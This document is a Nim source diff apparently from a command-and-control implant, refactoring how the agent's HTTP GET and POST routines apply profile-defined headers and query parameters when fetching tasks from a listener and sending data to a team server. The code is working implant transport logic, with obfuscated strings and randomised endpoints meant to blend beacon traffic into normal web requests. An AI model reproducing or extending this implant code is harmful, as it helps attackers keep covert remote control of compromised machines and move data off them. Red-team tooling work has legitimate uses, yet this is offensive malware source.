@@ -1,4 +1,4 @@
-import httpclient, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random
+import httpclient, strformat, strutils, asyncdispatch, base64, tables, random
 import ../utils/io
 import ../../common/[types, utils, profile]
 
@@ -11,8 +11,8 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
     var body: string = ""
 
     # Define request headers, as defined in profile
-    for header, value in ctx.profile.getTable(protect("http-get.agent.headers")): 
-        client.headers.add(header, value.getStringValue())
+    for header in ctx.profile.getTableKeys(protect("http-get.agent.headers")): 
+        client.headers.add(header.key, header.value.getStringValue())
 
     # Select a random endpoint to make the request to
     var endpoint = ctx.profile.getString(protect("http-get.endpoints"))
@@ -32,8 +32,8 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         discard 
 
     # Define additional request parameters
-    for param, value in ctx.profile.getTable(protect("http-get.agent.parameters")): 
-        endpoint &= fmt"{param}={value.getStringValue()}&"
+    for param in ctx.profile.getTableKeys(protect("http-get.agent.parameters")): 
+        endpoint &= fmt"{param.key}={param.value.getStringValue()}&"
 
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
@@ -68,8 +68,8 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
     let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-post.user-agent")))
 
     # Define request headers, as defined in profile
-    for header, value in ctx.profile.getTable(protect("http-post.agent.headers")): 
-        client.headers.add(header, value.getStringValue())
+    for header in ctx.profile.getTableKeys(protect("http-post.agent.headers")): 
+        client.headers.add(header.key, header.value.getStringValue())
     
     # Select a random endpoint to make the request to
     var endpoint = ctx.profile.getString(protect("http-post.endpoints"))
@@ -95,8 +95,8 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
         discard 
         
     # Define additional request parameters
-    for param, value in ctx.profile.getTable(protect("http-post.agent.parameters")): 
-        endpoint &= fmt"{param}={value.getStringValue()}&"
+    for param in ctx.profile.getTableKeys(protect("http-post.agent.parameters")): 
+        endpoint &= fmt"{param.key}={param.value.getStringValue()}&"
 
     try:
         # Send post request to team server
